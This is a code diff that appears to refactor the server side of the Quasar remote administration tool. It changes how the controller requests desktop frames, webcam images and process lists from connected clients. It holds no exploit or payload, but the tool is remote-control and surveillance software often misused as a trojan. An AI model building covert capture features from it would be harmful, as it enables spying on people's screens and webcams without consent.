@@ -3,11 +3,11 @@ using System.IO;
 using System.Linq;
 using System.Drawing;
 using System.Threading;
+using Quasar.Common.Packets;
+using Quasar.Common.Video.Codecs;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
-using xServer.Core.Packets.ClientPackets;
-using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
 
 namespace xServer.Core.Commands
@@ -72,7 +72,7 @@ namespace xServer.Core.Commands
             packet.Image = null;
 
             if (client.Value != null && client.Value.FrmRdp != null && client.Value.FrmRdp.IsStarted)
-                new GetDesktop(packet.Quality, packet.Monitor).Execute(client);
+                client.Send(new GetDesktop {Quality = packet.Quality, Monitor = packet.Monitor});
         }
 
         public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
@@ -85,8 +85,8 @@ namespace xServer.Core.Commands
             // None of the arrays containing the process' information can be null.
             // The must also be the exact same length because each entry in the three
             // different arrays represents one process.
-            if (packet.Processes == null || packet.IDs == null || packet.Titles == null ||
-                packet.Processes.Length != packet.IDs.Length || packet.Processes.Length != packet.Titles.Length)
+            if (packet.Processes == null || packet.Ids == null || packet.Titles == null ||
+                packet.Processes.Length != packet.Ids.Length || packet.Processes.Length != packet.Titles.Length)
                 return;
 
             new Thread(() =>
@@ -96,13 +96,13 @@ namespace xServer.Core.Commands
 
                 for (int i = 0; i < packet.Processes.Length; i++)
                 {
-                    if (packet.IDs[i] == 0 || packet.Processes[i] == "System.exe")
+                    if (packet.Ids[i] == 0 || packet.Processes[i] == "System.exe")
                         continue;
 
                     if (client.Value == null || client.Value.FrmTm == null)
                         break;
                     
-                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.IDs[i], packet.Titles[i]);
+                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.Ids[i], packet.Titles[i]);
                 }
             }).Start();
         }
@@ -208,7 +208,7 @@ namespace xServer.Core.Commands
 
             if (client.Value != null && client.Value.FrmWebcam != null && client.Value.FrmWebcam.IsStarted)
             {
-                new GetWebcam(packet.Webcam, packet.Resolution).Execute(client);
+                client.Send(new GetWebcam {Webcam = packet.Webcam, Resolution = packet.Resolution});
             }
         }
     }
